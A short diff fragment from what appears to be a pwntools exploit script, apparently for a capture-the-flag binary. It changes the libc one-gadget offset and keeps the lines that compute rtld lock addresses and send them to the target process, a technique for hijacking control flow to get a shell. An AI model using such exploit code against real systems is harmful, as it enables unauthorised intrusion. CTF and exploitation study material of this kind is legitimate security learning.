@@ -30,7 +30,7 @@ constraints:
 addr_rtld_recursive = addr_libc_base + 0x5f0f48
 addr_rtld_lock = addr_libc_base + 0x61b968
 addr_main = addr_libc_base + libc.symbols['__libc_start_main']
-addr_oneshot = addr_libc_base + 0x4526a
+addr_oneshot = addr_libc_base + 0xf02a4
 
 #raw_input('debug: ' + str(p.pid))
 p.sendlineafter('addr: ', str(addr_rtld_recursive))
